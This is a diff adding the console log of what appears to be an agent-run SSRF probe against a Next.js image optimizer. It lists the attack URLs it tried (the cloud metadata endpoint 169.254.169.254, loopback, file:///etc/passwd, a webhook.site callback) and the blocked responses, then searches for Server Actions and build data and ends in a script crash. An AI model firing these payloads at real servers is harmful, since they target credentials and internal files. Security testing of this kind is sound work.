@@ -1,0 +1,27 @@
+=== 1) /_next/image : l optimiseur Next.js est-il un SSRF (et renvoie-t-il le contenu ?) ===
+  url=https://webhook.site/<uuid>/...png              HTTP 400   767ms  ct=- len=30
+        corps: "url" parameter is not allowed
+  url=http://notre-serveur/probe.png (http)           HTTP 403   404ms  ct=application/json len=151
+        corps: {"errors":[{"message":"This request was refused by the firewall in front of the API, not by the API itself.","extensions":{"code":"REQUEST_BLOCKED"}}]}
+  url=http://169.254.169.254/latest/meta-data/ (IMDS) HTTP 403   138ms  ct=application/json len=151
+        corps: {"errors":[{"message":"This request was refused by the firewall in front of the API, not by the API itself.","extensions":{"code":"REQUEST_BLOCKED"}}]}
+  url=http://127.0.0.1:3000/api/health (loopback)     HTTP 403   148ms  ct=application/json len=151
+        corps: {"errors":[{"message":"This request was refused by the firewall in front of the API, not by the API itself.","extensions":{"code":"REQUEST_BLOCKED"}}]}
+  url=file:///etc/passwd                              HTTP 400   166ms  ct=- len=26
+        corps: "url" parameter is invalid
+
+=== 2) le webhook a-t-il recu les requetes de l optimiseur ? ===
+  requetes vues sur le webhook contenant nextjs-image-probe : 0
+
+=== 3) Next.js : Server Actions, buildId, source maps, endpoint de debug ===
+  buildId: (non trouve dans le HTML)
+  action ids trouves dans le HTML : aucun
+file:///tmp/opencode/nextjs-probe.mjs:45
+  if (/createServerReference|\$\$ACTION|actionId/i.test(js)) console.log("  " + c.split("/").pop() + " : contient des Server Actions (" + acts.join(",") + ")");
+                                                                                  ^
+
+TypeError: c.split is not a function
+    at file:///tmp/opencode/nextjs-probe.mjs:45:83
+    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
+
+Node.js v20.20.2
